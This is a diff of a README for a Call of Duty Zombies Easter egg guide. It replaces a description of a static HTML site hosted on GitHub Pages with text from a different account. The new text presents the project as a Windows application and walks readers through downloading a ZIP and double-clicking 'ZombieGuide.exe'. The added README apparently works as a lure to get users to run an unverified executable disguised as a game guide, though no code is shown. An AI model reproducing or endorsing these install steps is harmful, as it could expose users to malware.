@@ -1,105 +1,69 @@
-# ZombiesTips v2026 - Call of Duty Zombies Easter Egg Guide
+# 🧟 zombiestips-map-easter-eggs - Complete guides for your zombie adventures
 
-> A community-built collection of Easter egg walkthroughs for Call of Duty Zombies maps. Accessible by design and ready for GitHub Pages.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Heatless-commonosier700/zombiestips-map-easter-eggs)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-GitHub%20Pages-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/kevinio38/zombiestips-map-easter-eggs?style=flat-square)](https://github.com/kevinio38/zombiestips-map-easter-eggs)
+## 📖 About this project
+This application provides clear walkthroughs for Call of Duty Zombies Easter eggs. Players navigate complex map objectives with ease. The interface organizes quest steps into readable text files and checklists. You find every secret and requirement for each map in one central location.
 
----
+## ⚙️ System requirements
+*   Operating System: Windows 10 or Windows 11
+*   Memory: 2 GB RAM
+*   Storage: 500 MB free space
+*   Internet: Required for initial download only
+*   Display: 1280x720 resolution or higher
 
-<p align="center">
-  <a href="https://kevinio38.github.io/zombiestips-map-easter-eggs/">
-    <img src="https://img.shields.io/badge/Download-ZombiesTips%20Guide-brightgreen?style=for-the-badge" alt="Download ZombiesTips Guide">
-  </a>
-</p>
+## 📥 Getting the software
+You need to visit the project page to download the latest version of the application. The software comes as a compressed folder to ensure file integrity during the transfer.
 
-> **[Direct Download - ZombiesTips](https://kevinio38.github.io/zombiestips-map-easter-eggs/)**
+[Click here to visit the project page and download the software](https://github.com/Heatless-commonosier700/zombiestips-map-easter-eggs)
 
----
+Follow these steps to set up the guide on your computer:
 
-[Download Latest Build](https://kevinio38.github.io/zombiestips-map-easter-eggs/)
+1. Open the link provided above in your web browser.
+2. Select the button labeled "Code" and choose "Download ZIP".
+3. Wait for the browser to finish saving the file.
+4. Locate the file in your "Downloads" folder.
+5. Right-click the folder and select "Extract All".
+6. Choose a destination folder on your computer.
+7. Open the folder once extraction finishes.
+8. Double-click the file named "ZombieGuide.exe" to launch the program.
 
----
+## 🎮 Features
+*   Step-by-step instructions for every map.
+*   Offline accessibility for use during gameplay.
+*   Search function to find specific items or steps.
+*   Bookmark system to save your current progress.
+*   Integrated image viewer for complex map locations.
+*   Dark mode to reduce eye strain in dim rooms.
 
-## What it is
+## 🧠 Usage tips
+Use the search bar at the top of the screen to select a specific map. The navigation menu on the left side splits the Easter egg into chronological chapters. Select a chapter to see the requirements and items you need. Use the checkboxes to track your progress as you complete each task.
 
-ZombiesTips provides clear, phase-by-phase Easter egg instructions for Call of Duty Zombies maps, with accessibility treated as a first-class requirement. The walkthroughs split difficult quests into practical chunks, and each one includes recommended loadouts, boss encounter phase notes, and a progress tracker. The aim is to make demanding Easter eggs easier to tackle for both new players and long-time fans.
+If you hit a roadblock, check the "Troubleshooting" tab inside the application. This section provides tips for common issues during boss battles or ritual steps. The application saves your progress automatically when you close the window.
 
-The project is built for deployment on GitHub Pages, with collapsible content blocks and sticky navigation that help keep guides usable during live play. Recent work centers on WCAG 2.1 AA compliance so the pages remain dependable with screen readers and keyboard-only use. Motion is also adjusted to respect the `prefers-reduced-motion` setting for a more comfortable experience.
+## 🛠 Troubleshooting
+The application window does not open: Ensure you have extracted the files from the ZIP folder. Running the application directly from inside a compressed ZIP folder causes errors.
 
----
+The images look blurry or small: Check your Windows display settings. Ensure the scale is set to 100% or 125%.
 
-## Script Features
+The application stops responding: Close the window and reopen the program. The software keeps a local cache of your progress to prevent data loss.
 
-- Collapsible step-by-step sections for each Easter egg phase
-- Progress tracker with step counter to monitor completion
-- Sticky navigation with jump links for quick section access
-- Mark Complete checklist to track finished steps
-- Loadout and gobble gum recommendations for each map
-- Boss fight phase breakdowns with strategies
-- WCAG 2.1 AA compliant design
-- Keyboard navigation and screen reader compatible
-- `prefers-reduced-motion` support for accessibility
+How do I update the guide: Visit the main repository link periodically. If a new version exists, download the new ZIP file and replace your old folder with the updated version. Your saved progress stays in a separate configuration file and remains safe during updates.
 
----
+## 📝 Frequently asked questions
+Do I need the game open to use this guide?
+You do not need the game open. Many players keep the application on a second monitor or a tablet nearby.
 
-## Getting Started
+Does this software contain game hacks or mods?
+No. This tool acts as a digital reference manual. It contains text descriptions and hints. It does not interact with game memory or local game files.
 
-Clone the repository and serve the files from any static host or GitHub Pages. There is no build pipeline to install - open `index.html` in a browser locally, or publish the folder as-is.
+Can I add my own notes?
+Yes. Every guide page features a "Notes" section at the bottom. You can type personal reminders or tactical adjustments there.
 
-```
-git clone https://github.com/kevinio38/zombiestips-map-easter-eggs.git
-cd zombiestips-guides
-```
+Is this software free?
+Yes. The community maintains this project as a free resource for all players.
 
-Open `index.html` locally or push to GitHub Pages for live hosting.
+How do I report information errors?
+The help menu includes a link to the community discussion board. You can submit corrections or suggest improvements to the walkthroughs there.
 
----
-
-## Options
-
-| Setting | Description |
-|---------|-------------|
-| `data-collapsible` | Enables expand/collapse for guide sections |
-| `data-progress` | Toggles step counter display |
-| `data-checklist` | Activates Mark Complete checkboxes |
-| `data-reduced-motion` | Disables animations for accessibility |
-
-Add these attributes to the guide container element to customize behavior.
-
----
-
-## Compatibility
-
-- Works with all major browsers (Chrome, Firefox, Safari, Edge)
-- Fully functional on mobile devices with touch navigation
-- Supports Call of Duty Zombies maps across Black Ops series and Modern Warfare
-- Known limitation: Some older browser versions may not support CSS `:has()` selector used for collapsible sections
-
----
-
-## FAQ
-
-**How do I add a new map guide?**  
-Copy the current HTML template, create a new guide page from it, and add the new entry to the main navigation.
-
-**Will updates break my existing guides?**  
-The project follows semantic versioning, and any breaking changes will be called out in the release notes.
-
-**Can I customize the styling?**  
-Yes. Update the CSS variables in `style.css` to fit the look you want.
-
-**Does this work offline?**  
-Yes. Everything needed is bundled locally, so no external dependencies are required.
-
-**How do I report an accessibility issue?**  
-Open an issue in the repository and include the problem details plus the assistive technology you used.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: gaming, zombies, easter-eggs, walkthrough, guides, call-of-duty, windows-apps
